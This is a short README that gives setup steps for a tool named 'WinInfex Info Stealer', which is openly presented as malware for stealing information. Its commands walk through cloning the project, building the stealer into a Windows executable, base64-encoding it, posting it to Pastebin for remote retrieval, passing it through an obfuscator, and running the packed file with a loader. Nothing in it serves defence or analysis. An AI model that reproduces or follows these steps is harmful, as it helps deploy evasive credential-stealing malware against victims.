# WinInfex Info Stealer
# Setup on PowerShell 
- git clone https://github.com/vicouncil/WinInfex
- cd WinInfex
- cd resource
- pip install -r requirements.txt
- python -m PyInstaller --onefile winInfex.py
- cd dist
- [Convert]::ToBase64String([IO.File]::ReadAllBytes("winInfex.exe")) > base64.txt
- Post base64.txt file in pastebin
- Go to directory with obfuscator
- .\obfuscator.exe
- Move your .ifx file in directory ifxrunner
- .\ifxrunner.exe filename.ifx
